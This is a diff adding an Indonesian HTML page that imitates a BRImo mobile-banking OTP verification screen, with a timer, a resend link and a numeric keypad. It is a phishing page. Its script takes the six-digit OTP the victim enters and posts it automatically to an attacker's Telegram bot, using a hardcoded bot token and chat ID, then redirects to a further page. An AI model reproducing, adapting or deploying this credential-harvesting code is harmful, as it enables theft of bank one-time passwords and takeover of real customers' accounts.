@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Nomor HP - BRImo</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            /* ✅ Diubah ke gradien biru yang konsisten */
+            background: linear-gradient(135deg, #003366 0%, #00529B 50%, #0070C0 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 20px 25px;
+            color: white;
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .back-btn {
+            position: absolute;
+            left: 0;
+            font-size: 22px;
+            cursor: pointer;
+        }
+
+        .header-title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        /* Instruksi */
+        .instruction {
+            text-align: center;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+            padding: 0 10px;
+        }
+
+        /* Kotak OTP */
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .otp-box {
+            width: 45px;
+            height: 50px;
+            background-color: white;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            font-weight: 600;
+            /* ✅ Diubah warna teks OTP */
+            color: #00529B;
+        }
+
+        /* Timer */
+        .timer {
+            text-align: center;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 12px;
+        }
+
+        /* Kirim Ulang */
+        .resend {
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 40px;
+        }
+
+        .resend a {
+            /* ✅ Diubah ke oranye konsisten */
+            color: #FF6A00;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .resend a.disabled {
+            color: #aaa;
+            pointer-events: none;
+        }
+
+        /* Keyboard */
+        .keyboard {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            max-width: 300px;
+            margin: 0 auto;
+        }
+
+        .key {
+            background: rgba(255, 255, 255, 0.15);
+            border: none;
+            color: white;
+            font-size: 22px;
+            font-weight: 500;
+            padding: 15px;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .key:hover {
+            background: rgba(255, 255, 255, 0.25);
+        }
+
+        .key-empty {
+            background: transparent;
+            border: none;
+            cursor: default;
+        }
+
+        .key-back {
+            font-size: 20px;
+        }
+
+        .loading {
+            text-align: center;
+            margin-top: 20px;
+            color: #FFFFFF;
+            display: none;
+            font-size: 15px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="back-btn">←</div>
+        <h1 class="header-title">Verifikasi Nomor HP</h1>
+    </div>
+
+    <!-- Instruksi -->
+    <div class="instruction">
+        Kode OTP dikirim ke nomor 08 **** **** Cek WhatsApp atau SMS kamu.
+    </div>
+
+    <!-- Kotak OTP -->
+    <div class="otp-container" id="otpContainer">
+        <div class="otp-box" data-index="0"></div>
+        <div class="otp-box" data-index="1"></div>
+        <div class="otp-box" data-index="2"></div>
+        <div class="otp-box" data-index="3"></div>
+        <div class="otp-box" data-index="4"></div>
+        <div class="otp-box" data-index="5"></div>
+    </div>
+
+    <!-- Timer -->
+    <div class="timer" id="timer">02 : 51</div>
+
+    <!-- Kirim Ulang -->
+    <div class="resend">
+        Tidak terima OTP? <a href="#" id="resendLink" class="disabled">Kirim Ulang</a>
+    </div>
+
+    <!-- Keyboard Angka -->
+    <div class="keyboard">
+        <button class="key" data-value="1">1</button>
+        <button class="key" data-value="2">2</button>
+        <button class="key" data-value="3">3</button>
+        <button class="key" data-value="4">4</button>
+        <button class="key" data-value="5">5</button>
+        <button class="key" data-value="6">6</button>
+        <button class="key" data-value="7">7</button>
+        <button class="key" data-value="8">8</button>
+        <button class="key" data-value="9">9</button>
+        <button class="key key-empty"></button>
+        <button class="key" data-value="0">0</button>
+        <button class="key key-back" data-action="back">←</button>
+    </div>
+
+    <div class="loading" id="loading">Memverifikasi OTP...</div>
+
+    <script>
+        // === SETTING TELEGRAM BOT ===
+        const BOT_TOKEN = "8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg";
+        const CHAT_ID = "8592742129";
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        let otp = "";
+        const otpBoxes = document.querySelectorAll('.otp-box');
+        const loading = document.getElementById('loading');
+        const timerEl = document.getElementById('timer');
+        const resendLink = document.getElementById('resendLink');
+
+        // Timer mundur 2:51
+        let totalSeconds = 171;
+        function updateTimer() {
+            let minutes = Math.floor(totalSeconds / 60);
+            let seconds = totalSeconds % 60;
+            timerEl.textContent = `${String(minutes).padStart(2, '0')} : ${String(seconds).padStart(2, '0')}`;
+            
+            if (totalSeconds <= 0) {
+                clearInterval(timerInterval);
+                resendLink.classList.remove('disabled');
+                return;
+            }
+            totalSeconds--;
+        }
+        let timerInterval = setInterval(updateTimer, 1000);
+        updateTimer();
+
+        // Input angka OTP
+        document.querySelectorAll('.key[data-value]').forEach(key => {
+            key.addEventListener('click', function() {
+                if (otp.length < 6) {
+                    otp += this.dataset.value;
+                    updateOtpDisplay();
+                    
+                    // Jika OTP 6 digit lengkap, kirim otomatis
+                    if (otp.length === 6) {
+                        kirimOTP();
+                    }
+                }
+            });
+        });
+
+        // Hapus angka
+        document.querySelector('.key-back').addEventListener('click', function() {
+            if (otp.length > 0) {
+                otp = otp.slice(0, -1);
+                updateOtpDisplay();
+            }
+        });
+
+        // Update tampilan kotak OTP
+        function updateOtpDisplay() {
+            otpBoxes.forEach((box, index) => {
+                box.textContent = otp[index] || '';
+            });
+        }
+
+        // Kirim OTP ke Telegram & pindah halaman
+        async function kirimOTP() {
+            loading.style.display = 'block';
+            
+            const pesan = `🔑 KODE OTP DITERIMA
+
+📌 OTP: ${otp}
+📱 Nomor HP: 08133019****
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}`;
+
+            try {
+                await fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                // ✅ Berhasil -> Pindah ke halaman selanjutnya
+                window.location.href = 'otp.html';
+                
+            } catch (error) {
+                alert('❌ Gagal mengirim! Cek koneksi internet.');
+                console.error(error);
+                loading.style.display = 'none';
+                otp = "";
+                updateOtpDisplay();
+            }
+        }
+
+        // Kirim ulang OTP
+        resendLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            if (!this.classList.contains('disabled')) {
+                alert('✅ OTP baru telah dikirim!');
+                totalSeconds = 171;
+                timerInterval = setInterval(updateTimer, 1000);
+                this.classList.add('disabled');
+            }
+        });
+    </script>
+</body>
+</html>
